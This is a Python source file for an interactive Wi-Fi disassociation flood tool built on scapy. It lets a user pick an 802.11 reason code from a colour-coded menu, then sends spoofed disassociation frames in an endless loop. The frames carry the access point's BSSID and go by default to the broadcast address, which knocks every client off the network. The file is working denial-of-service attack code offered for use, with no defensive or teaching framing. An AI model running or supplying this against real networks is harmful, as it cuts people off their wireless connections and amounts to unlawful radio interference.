import json
import os
import time

from scapy.all import Dot11, Dot11Disas, RadioTap, sendp

from debugs import debug

BOLD   = "\033[1m"
RESET  = "\033[0m"
RED    = "\033[31m"
YELLOW = "\033[33m"
GREEN  = "\033[32m"

TIER_COLOR = {"red": RED, "yellow": YELLOW, "green": GREEN}

_HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_REASONS_PATH = os.path.join(_HERE, "deps", "disassoc_reasons.json")

def _load_reasons(path):
    with open(path, "r") as f:
        return json.load(f)


def _print_reason_grid(reasons):
    entries = []
    for num in sorted(reasons.keys(), key=int):
        meta = reasons[num]
        color = TIER_COLOR.get(meta.get("tier", "yellow"), YELLOW)
        plain = f"{num}. {meta['short']}"
        colored = f"{color}{BOLD}{num}.{RESET}{color} {meta['short']}{RESET}"
        entries.append((plain, colored))

    col_gap = 4
    max_plain = max(len(p) for p, _ in entries)
    col_w = max_plain + col_gap
    cols = 3

    for i in range(0, len(entries), cols):
        row = entries[i:i + cols]
        line = ""
        for j, (plain, colored) in enumerate(row):
            line += colored
            if j != len(row) - 1:
                line += " " * (col_w - len(plain))
        print(line)

    print()
    print(f"{RED}RED{RESET} = Unusual but works,   "
          f"{YELLOW}YELLOW{RESET} = Uncommonly Used,   "
          f"{GREEN}GREEN{RESET} = Commonly Used")
    print()


def _choose_reason(reasons_path=DEFAULT_REASONS_PATH):
    reasons = _load_reasons(reasons_path)

    while True:
        _print_reason_grid(reasons)

        raw = input("Reason: ").strip() or "0"
        if raw == "0":
            return None
        if raw not in reasons:
            print(f"\n[!] '{raw}' is not a listed reason. Try again.\n")
            continue

        meta = reasons[raw]
        color = TIER_COLOR.get(meta.get("tier", "yellow"), YELLOW)
        print(f"\n{color}{BOLD}{raw}. {meta['short']}{RESET}")
        print(f"    {meta['desc']}\n")
        print("1. Start flood")
        print("0. Go back")

        confirm = input("Choice (empty = 0): ").strip() or "0"
        if confirm == "0":
            print()
            continue
        if confirm == "1":
            return raw

        print("\n[!] Invalid choice.\n")


def disassoc_all(iface, bssid, client="ff:ff:ff:ff:ff:ff", burst=2, inter=0.0003):
    reason = _choose_reason()
    raw = bytes(
        RadioTap()
        / Dot11(type=0, subtype=10,
                addr1=client, addr2=bssid, addr3=bssid)
        / Dot11Disas(reason=int(reason))
    )
    try:
        while True:
            sendp(raw, iface=iface, count=burst, verbose=False,
                realtime=False, inter=0)
            if inter:
                time.sleep(inter)
    except KeyboardInterrupt:
        debug("info", "Disassociation flood interrupted by user")
        return
